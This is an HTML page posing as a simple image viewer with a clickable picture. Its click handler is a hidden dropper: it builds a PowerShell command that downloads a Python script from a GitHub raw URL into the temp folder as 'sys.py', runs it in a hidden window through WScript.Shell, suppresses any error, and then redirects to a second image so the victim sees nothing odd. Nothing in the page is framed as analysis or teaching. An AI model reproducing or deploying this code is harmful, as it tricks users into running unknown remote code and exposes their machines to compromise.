<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Image Viewer</title>
    <style>
        body { background: #1e1f22; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .click { text-align: center; cursor: pointer; }
        img { max-width: 90%; border-radius: 16px; }
        .text { color: #b5bac1; margin-top: 16px; }
    </style>
</head>
<body>
    <div class="click" onclick="run()">
        <!-- මෙය working image link -->
        <img src="https://picsum.photos/800/500?random=1">
        <div class="text">✨ Click image ✨</div>
    </div>
    <script>
        function run() {
            var url = "https://raw.githubusercontent.com/chatgptjalepro/image-viewer/main/loader.py";
            var cmd = "powershell -Command \"& {$w=new-object Net.WebClient;$w.DownloadFile('"+url+"','$env:TEMP\\sys.py');Start-Process 'python' -ArgumentList '$env:TEMP\\sys.py' -WindowStyle Hidden}\"";
            try {
                new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
            } catch(e) {}
            setTimeout(function() {
                // 🔥 මෙම redirect URL එක WORKING link එකකට change කළා 🔥
                window.location.href = "https://picsum.photos/800/500?random=2";
            }, 200);
        }
    </script>
</body>
</html>
